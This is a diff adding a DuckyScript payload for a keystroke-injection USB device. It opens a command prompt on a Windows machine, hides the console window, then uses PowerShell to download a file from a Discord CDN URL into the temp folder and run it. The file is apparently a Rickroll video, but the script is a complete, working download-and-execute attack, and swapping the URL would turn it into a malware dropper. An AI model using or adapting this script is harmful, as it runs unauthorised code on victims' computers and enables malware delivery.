@@ -1,0 +1,33 @@
+REM Wait until initialized
+ATTACKMODE HID
+DELAY 1000
+
+
+REM Open command prompt
+GUI r
+DELAY 200
+STRINGLN cmd
+DELAY 400
+
+
+REM Hide and configure console
+STRINGLN
+    @echo off
+    mode con: cols=15 lines=1
+    color fe
+    chcp 65001
+    title 
+END_STRINGLN
+
+REM Configuration
+STRINGLN
+    set u='https://cdn.discordapp.com/attachments/1154635152610299964/1155258532598382744/rick.mp4'
+    set f=%tmp%\rick.mp4
+END_STRINGLN
+
+REM Download, Execute and Exit
+STRINGLN powershell -c "Invoke-WebRequest %u% -OutFile '%f%'" && start "" "%f% && exit"
+
+
+REM Set as storage device for debugging
+ATTACKMODE STORAGE
